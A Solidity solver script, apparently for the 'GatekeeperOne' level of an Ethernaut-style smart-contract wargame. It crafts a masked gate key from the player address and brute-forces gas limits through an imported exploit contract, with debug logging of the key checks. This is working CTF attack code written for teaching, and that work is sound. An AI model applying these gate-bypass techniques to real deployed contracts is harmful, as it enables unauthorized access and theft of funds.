// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "./SolveLevelBase.sol";
import "../src/interfaces/IGatekeeperOne.sol";
import "../src/exploits/GatekeeperOneExploit.sol";

contract SolveLevel13 is SolveLevelBase {
    function getInstanceCreationData()
        internal
        pure
        override
        returns (address levelAddress, uint256 value)
    {
        levelAddress = 0x46f79002907a025599f355A04A512A6Fd45E671B;
        value = 0;
    }

    function solveLevel(address instanceAddress, address player)
        internal
        override
    {
        IGatekeeperOne instance = IGatekeeperOne(payable(instanceAddress));
        GatekeeperOneExploit exploit = new GatekeeperOneExploit(instance);

        bytes8 _gateKey = bytes8(bytes20((uint160(player))));
        _gateKey = bytes8(
            bytes.concat(
                bytes6(0x000011110000),
                bytes2(uint16(uint160(player)))
            )
        );
        examineGateKey(_gateKey, player);

        bool success = false;
        for (uint256 i = 0; !success && i < 9; i++) {
            uint256 initialGasLimit = 55_000 + i * 1000;
            success = exploit.exploit{gas: 6721975}(_gateKey, initialGasLimit);
        }
    }

    function examineGateKey(bytes8 _gateKey, address player) public view {
        console.log(player);
        console.log(uint64(_gateKey));
        console.log(uint32(uint64(_gateKey)));
        console.log(uint16(uint64(_gateKey)));
        console.log(uint64(_gateKey));
        console.log(uint16(uint160(player)));

        console.log(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)));
        console.log(uint32(uint64(_gateKey)) != uint64(_gateKey));
        console.log(uint32(uint64(_gateKey)) == uint16(uint160(player)));
    }
}
